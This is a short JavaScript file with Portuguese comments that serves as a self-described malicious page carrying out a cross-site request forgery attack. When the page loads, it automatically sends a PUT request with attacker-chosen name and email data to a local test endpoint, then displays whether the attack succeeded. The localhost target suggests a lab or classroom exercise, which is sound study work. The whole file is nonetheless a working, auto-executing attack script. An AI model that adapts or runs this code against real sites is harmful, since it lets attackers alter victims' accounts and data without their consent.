// Configurações do ataque
const TARGET_URL = 'http://localhost:3000/teste-csrf/17';
const MALICIOUS_DATA = {
  nome: "Hacker",
  email: "hacker@gmail.com"
};

// Função principal para executar o ataque
async function executeCSRFAttack() {
  const statusElement = createStatusElement();
  
  try {
    statusElement.innerHTML = 'Iniciando ataque CSRF';
    console.log('[CSRF] Iniciando ataque');

    // Envia a requisição maliciosa
    const response = await fetch(TARGET_URL, {
      method: 'PUT',
      headers: { 
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(MALICIOUS_DATA)
    });

    // Processa a resposta
    if (!response.ok) {
      const errorText = await response.text();
      throw new Error(`Erro HTTP ${response.status}: ${errorText}`);
    }

    const data = await response.json();
    
    // Feedback de sucesso
    statusElement.innerHTML = 'Ataque CSRF bem-sucedido!';
    console.log('[CSRF] Sucesso:', data);
  
  } catch (error) {
    // Feedback de erro
    statusElement.innerHTML = 'Falha no ataque CSRF';
    console.error('[CSRF] Falha:', error.message);
    
  }
}

// Executa o ataque quando o script é carregado
(function() {
  const title = document.createElement('h2');
  title.textContent = 'Pagina Maliciosa';
  title.style.textAlign = 'center';
  title.style.marginTop = '20px';
  document.body.prepend(title);
  
  // Executa o ataque automaticamente
  executeCSRFAttack();
})();